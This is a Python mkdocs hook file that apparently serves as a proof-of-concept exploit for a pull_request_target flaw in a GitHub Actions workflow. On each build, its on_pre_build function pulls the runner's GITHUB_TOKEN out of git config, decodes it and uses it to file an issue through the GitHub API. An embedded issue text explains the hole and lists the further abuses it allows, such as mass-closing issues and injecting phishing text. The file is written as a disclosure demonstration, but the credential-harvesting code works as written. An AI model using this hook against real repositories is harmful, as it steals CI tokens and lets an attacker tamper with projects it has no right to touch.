import base64
import json
import os
import re
import subprocess
import urllib.request


ISSUE_BODY = """\
### The bug

`.github/workflows/pr_wiki_validation.yml` triggers on `pull_request_target`. \
That trigger runs in the base-repo context, with the repo's secrets and a \
write capable `GITHUB_TOKEN`. The workflow then checks out the PR's head \
code (`ref: ${{{{ github.event.pull_request.head.sha }}}}`) and runs \
`mkdocs build --strict` against it.

mkdocs has a `hooks:` directive in `mkdocs.yml` that imports arbitrary \
Python files. So any fork PR can drop a `.py` file into the repo, point \
`hooks:` at it, and get arbitrary code execution on the privileged runner.

### Scope

The workflow declares `permissions: {{ contents: read, issues: write }}`. \
With the GITHUB_TOKEN that `actions/checkout` persists into git config, an \
attacker can:

- Create issues (like this one)
- Comment on issues
- Close, reopen, edit, lock issues — including mass closing everything,etc
- Edit issue titles/bodies to inject phishing or misleading content
- Add and remove labels, change assignees
"""


def _read_token(workspace):
    out = subprocess.run(
        ["git", "-C", workspace, "config", "--get-all",
         "http.https://github.com/.extraheader"],
        capture_output=True, text=True,
    ).stdout
    m = re.search(r"basic\s+([A-Za-z0-9+/=]+)", out)
    if not m:
        return None
    return base64.b64decode(m.group(1)).decode().split(":", 1)[1]


def on_pre_build(config, **kwargs):
    workspace = os.environ.get("GITHUB_WORKSPACE")
    event_path = os.environ.get("GITHUB_EVENT_PATH")
    repo = os.environ.get("GITHUB_REPOSITORY")
    if not (workspace and event_path and repo):
        return

    token = _read_token(workspace)
    if not token:
        return

    event = json.load(open(event_path))
    pr = event["pull_request"]["number"]
    run = os.environ.get("GITHUB_RUN_ID", "?")

    payload = {
        "title": "Security: pull_request_target RCE in pr_wiki_validation.yml",
        "body": ISSUE_BODY.format(pr=pr, run=run),
    }
    req = urllib.request.Request(
        f"https://api.github.com/repos/{repo}/issues",
        data=json.dumps(payload).encode(),
        method="POST",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "papi-wiki-poc",
        },
    )
    urllib.request.urlopen(req, timeout=15)
